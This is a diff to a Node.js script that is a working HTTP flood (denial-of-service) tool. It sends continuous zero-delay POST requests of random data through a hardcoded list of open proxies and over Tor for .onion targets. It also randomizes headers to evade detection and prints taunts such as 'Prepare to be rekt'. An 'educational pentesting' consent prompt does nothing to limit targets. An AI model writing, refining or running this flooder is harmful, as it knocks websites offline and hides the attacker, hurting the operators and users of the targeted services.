@@ -28,26 +28,26 @@ const config = {
     torMode: true           // Enable TOR for .onion sites - GO DEEP
   };
   
-  const fs = require('fs');
-  const http = require('http');
-  const https = require('https');
-  const url = require('url');
-  const crypto = require('crypto'); // For generating random data
-  const SocksProxyAgent = require('socks-proxy-agent'); // For TOR/SOCKS proxies
-  const readline = require('readline').createInterface({ // For getting user input
-    input: process.stdin,
-    output: process.stdout,
-  });
-  
-  // Load proxies from proxies.json
-  let proxies = [];
-  try {
-      const proxiesData = fs.readFileSync('public/main/proxies.json', 'utf8');
-      proxies = JSON.parse(proxiesData);
-      log(`[${config.colorScheme.darkGreen}] Successfully loaded ${proxies.length} proxies from public/main/proxies.json`);
-  } catch (err) {
-      log(`[${config.colorScheme.darkRed}] Failed to load proxies from public/main/proxies.json: ${err.message}. Using default proxy list.`);
-      proxies = [
+const fs = require('fs');
+const http = require('http');
+const https = require('https');
+const url = require('url');
+const crypto = require('crypto'); // For generating random data
+const SocksProxyAgent = require('socks-proxy-agent'); // For TOR/SOCKS proxies
+const readline = require('readline').createInterface({ // For getting user input
+  input: process.stdin,
+  output: process.stdout,
+});
+
+// Load proxies from proxies.json
+let proxies = [];
+try {
+    const proxiesData = fs.readFileSync('public/main/proxies.json', 'utf8');
+    proxies = JSON.parse(proxiesData);
+    log(`%c[SUCCESS] Successfully loaded ${proxies.length} proxies from public/main/proxies.json`, `color: ${config.colorScheme.darkGreen}`);
+} catch (err) {
+    log(`%c[ERROR] Failed to load proxies from public/main/proxies.json: ${err.message}. Using default proxy list.`, `color: ${config.colorScheme.darkRed}`);
+    proxies = [
         { "ip": "103.5.146.147", "port": 80, "protocol": "http", "anonymity": "transparent" },
         { "ip": "103.233.13.116", "port": 8080, "protocol": "http", "anonymity": "transparent" },
         { "ip": "103.228.121.14", "port": 80, "protocol": "http", "anonymity": "transparent" },
@@ -132,134 +132,153 @@ const config = {
         { "ip": "103.0.243.14", "port": 8080, "protocol": "http", "anonymity": "transparent" },
         { "ip": "103.0.158.2", "port": 80, "protocol": "http", "anonymity": "transparent" },
         { "ip": "103.0.156.6", "port": 80, "protocol": "http", "anonymity": "transparent" }
-      ];
-  }
-  
-  // Function to log actions (now with colors, baby!)
-  function log(message) {
-    const timestamp = new Date().toISOString();
-    const logEntry = `[${timestamp}] ${message}\n`;
-    fs.appendFile(config.logFile, logEntry, (err) => {
-      if (err) console.error('Failed to write to log file:', err);
-    });
-    console.log(message); // Output to console as well
-  }
-  
-  // Function to generate a random string of a specific length
-  function generateRandomString(length) {
-      return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
-  }
-  
-  // Function to generate random headers to evade detection
-  function generateRandomHeaders() {
-      const headers = {
-          'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 11)}.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 1000)}.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 150)}.0.${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 100)} Safari/${Math.floor(Math.random() * 1000)}.36`,
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-          'Accept-Language': 'en-US,en;q=0.5',
-          'Accept-Encoding': 'gzip, deflate, br',
-          'Connection': 'keep-alive',
-          'Upgrade-Insecure-Requests': '1',
-          'Cache-Control': 'max-age=0',
-          'TE': 'trailers',
-          'Pragma': 'no-cache'
-      };
-      return headers;
-  }
-  
-  // Function to perform the HTTP request
-  function attack(targetUrl, proxy) {
-    const parsedUrl = url.parse(targetUrl);
-  
-    // Determine whether to use HTTP or HTTPS based on the target URL
-    const protocol = parsedUrl.protocol === 'https:' ? https : http;
-  
-    let proxyOptions = {
-      host: proxy.ip,
-      port: proxy.port,
-      path: parsedUrl.href, // Send full URL in path
-      method: 'POST',           // Changed to POST - let's be more aggressive
-      headers: config.randomizeHeaders ? generateRandomHeaders() : {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    ];
+}
+
+// Function to log actions (now with colors, baby!)
+function log(message) {
+  const timestamp = new Date().toISOString();
+  const logEntry = `[${timestamp}] ${message}\n`;
+  fs.appendFile(config.logFile, logEntry, (err) => {
+    if (err) console.error('Failed to write to log file:', err);
+  });
+  console.log(message); // Output to console as well
+}
+
+// Function to generate a random string of a specific length
+function generateRandomString(length) {
+    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
+}
+
+// Function to generate random headers to evade detection
+function generateRandomHeaders() {
+    const headers = {
+        'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 11)}.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 1000)}.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 150)}.0.${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 100)} Safari/${Math.floor(Math.random() * 1000)}.36`,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate, br',
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1',
-        'Content-Type': 'application/x-www-form-urlencoded' // Added content type
-      }
+        'Cache-Control': 'max-age=0',
+        'TE': 'trailers',
+        'Pragma': 'no-cache'
     };
-    // Create a payload
-      const randomString = generateRandomString(1024); // Generate 1KB random string
-  
-      const postData = `data=${randomString}&payload=${config.payload}`;
-      proxyOptions.headers['Content-Length'] = Buffer.byteLength(postData);
-  
-    // If TOR mode is enabled, use SOCKS proxy
-    if (config.torMode && parsedUrl.hostname.endsWith('.onion')) {
-      const socksProxy = 'socks5://127.0.0.1:9050'; // Default TOR SOCKS proxy
-      const agent = new SocksProxyAgent(socksProxy);
-      proxyOptions.agent = agent;
-      proxyOptions.host = parsedUrl.hostname; // Target host for TOR
-      proxyOptions.path = parsedUrl.path;     // Target path for TOR
-      proxyOptions.port = parsedUrl.protocol === 'https:' ? 443 : 80; // Use default ports
+    return headers;
+}
+
+// Function to perform the HTTP request
+function attack(targetUrl, proxy) {
+  const parsedUrl = url.parse(targetUrl);
+
+  // Determine whether to use HTTP or HTTPS based on the target URL
+  const protocol = parsedUrl.protocol === 'https:' ? https : http;
+
+  let proxyOptions = {
+    host: proxy.ip,
+    port: proxy.port,
+    path: parsedUrl.href, // Send full URL in path
+    method: 'POST',           // Changed to POST - let's be more aggressive
+    headers: config.randomizeHeaders ? generateRandomHeaders() : {
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+      'Accept-Language': 'en-US,en;q=0.5',
+      'Accept-Encoding': 'gzip, deflate, br',
+      'Connection': 'keep-alive',
+      'Upgrade-Insecure-Requests': '1',
+      'Content-Type': 'application/x-www-form-urlencoded' // Added content type
     }
-    const req = protocol.request(proxyOptions, (res) => { // Use the determined protocol
-      log(`[${config.colorScheme.darkGreen}] Response: ${res.statusCode} from ${proxy.ip}:${proxy.port}`);
-      res.on('data', () => {}); // Consume response data
-      res.on('end', () => {});
-    });
-      req.write(postData);
-  
-    req.on('error', (err) => {
-      log(`[${config.colorScheme.darkRed}] Request error: ${err.message} via ${proxy.ip}:${proxy.port}`);
-    });
-  
-    req.setTimeout(config.requestTimeout, () => {
-      log(`[${config.colorScheme.darkRed}] Request timed out via ${proxy.ip}:${proxy.port}`);
-      req.abort();
-    });
-    req.end();
+  };
+  // Create a payload
+    const randomString = generateRandomString(1024); // Generate 1KB random string
+
+    const postData = `data=${randomString}&payload=${config.payload}`;
+    proxyOptions.headers['Content-Length'] = Buffer.byteLength(postData);
+
+  // If TOR mode is enabled, use SOCKS proxy
+  if (config.torMode && parsedUrl.hostname.endsWith('.onion')) {
+    const socksProxy = 'socks5://127.0.0.1:9050'; // Default TOR SOCKS proxy
+    const agent = new SocksProxyAgent(socksProxy);
+    proxyOptions.agent = agent;
+    proxyOptions.host = parsedUrl.hostname; // Target host for TOR
+    proxyOptions.path = parsedUrl.path;     // Target path for TOR
+    proxyOptions.port = parsedUrl.protocol === 'https:' ? 443 : 80; // Use default ports
   }
-  
-  // Main function to launch the attack
-  function launchAttack(targetUrl) {
-    log(`[${config.colorScheme.purple}] Attacking ${targetUrl} with ${config.threads} threads. Prepare to be rekt, Fucker.`);
-    for (let i = 0; i < config.threads; i++) {
-      const proxy = proxies[i % proxies.length]; // Cycle through proxies
-      setInterval(() => { // Send requests continuously
-        attack(targetUrl, proxy);
-      }, 0); // Send as fast as possible - FASTER!
-    }
+  const req = protocol.request(proxyOptions, (res) => { // Use the determined protocol
+    log(`%c[INFO] Response: ${res.statusCode} from ${proxy.ip}:${proxy.port}`, `color: ${config.colorScheme.darkGreen}`);
+    res.on('data', () => {}); // Consume response data
+    res.on('end', () => {});
+  });
+    req.write(postData);
+
+  req.on('error', (err) => {
+    log(`%c[ERROR] Request error: ${err.message} via ${proxy.ip}:${proxy.port}`, `color: ${config.colorScheme.darkRed}`);
+  });
+
+  req.setTimeout(config.requestTimeout, () => {
+    log(`%c[ERROR] Request timed out via ${proxy.ip}:${proxy.port}`, `color: ${config.colorScheme.darkRed}`);
+    req.abort();
+  });
+  req.end();
+}
+
+// Main function to launch the attack
+function launchAttack(targetUrl) {
+  log(`%c[ATTACK] Attacking ${targetUrl} with ${config.threads} threads. Prepare to be rekt, Fucker.`, `color: ${config.colorScheme.purple}`);
+  for (let i = 0; i < config.threads; i++) {
+    const proxy = proxies[i % proxies.length]; // Cycle through proxies
+    setInterval(() => { // Send requests continuously
+      attack(targetUrl, proxy);
+    }, 0); // Send as fast as possible - FASTER!
   }
-  
-  // Function to prompt user for explicit consent
-  function askForConsent() {
-    return new Promise((resolve) => {
-      readline.question(
-        `[${config.colorScheme.darkRed}] WARNING: This tool is for educational pentesting and research purposes only. Unauthorized use is ILLEGAL and can result in severe penalties. Do you consent to use this tool responsibly? (yes/no): `,
-        (answer) => {
-          resolve(answer.toLowerCase() === 'yes');
-          readline.close();
-        }
-      );
-    });
-  }
-  
-  // Get the target URL from the command line arguments
-  async function main() {
-    const targetUrl = process.argv[2];
-    if (!targetUrl) {
-      console.error('Target URL is required. Usage: node proxies.js <target_url>');
-      process.exit(1);
-    }
-      const consent = await askForConsent();
-      if (!consent) {
-          console.log(`[${config.colorScheme.darkRed}] User declined consent. Exiting.`);
-          process.exit(0);
+}
+
+// Function to prompt user for explicit consent
+function askForConsent() {
+  return new Promise((resolve) => {
+    readline.question(
+      `%c[WARNING] This tool is for educational pentesting and research purposes only. Unauthorized use is ILLEGAL and can result in severe penalties. Do you consent to use this tool responsibly? (yes/no): `,
+      (answer) => {
+        resolve(answer.toLowerCase() === 'yes');
+        readline.close();
       }
-  
-    // Start the attack
-    launchAttack(targetUrl);
+    );
+  });
+}
+
+// Get the target URL from the command line arguments
+async function main() {
+  const targetUrl = process.argv[2];
+  if (!targetUrl) {
+    console.error('Target URL is required. Usage: node proxies.js <target_url>');
+    process.exit(1);
   }
-  
-  main();
+    const consent = await askForConsent();
+    if (!consent) {
+        console.log(`%c[INFO] User declined consent. Exiting.`, `color: ${config.colorScheme.darkBlue}`);
+        process.exit(0);
+    }
+
+  // Start the attack
+  launchAttack(targetUrl);
+}
+
+main();
+
+// Add global error handling
+process.on('uncaughtException', (err) => {
+    console.error(`%c[FATAL] Uncaught exception: ${err.message}`, `color: ${config.colorScheme.darkRed}`);
+    fs.appendFile(config.logFile, `[${new Date().toISOString()}] FATAL: Uncaught exception: ${err.stack}\n`, (logErr) => {
+        if (logErr) console.error('Failed to write to log file:', logErr);
+    });
+    process.exit(1);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error(`%c[FATAL] Unhandled rejection: ${reason}`, `color: ${config.colorScheme.darkRed}`);
+    fs.appendFile(config.logFile, `[${new Date().toISOString()}] FATAL: Unhandled rejection: ${reason}\n`, (logErr) => {
+        if (logErr) console.error('Failed to write to log file:', logErr);
+    });
+});
+
+// Add this to the top of your script
+console.log("%cNoodles is running, you crazy son of a bitch!", "color: lime; font-size: 20px;");
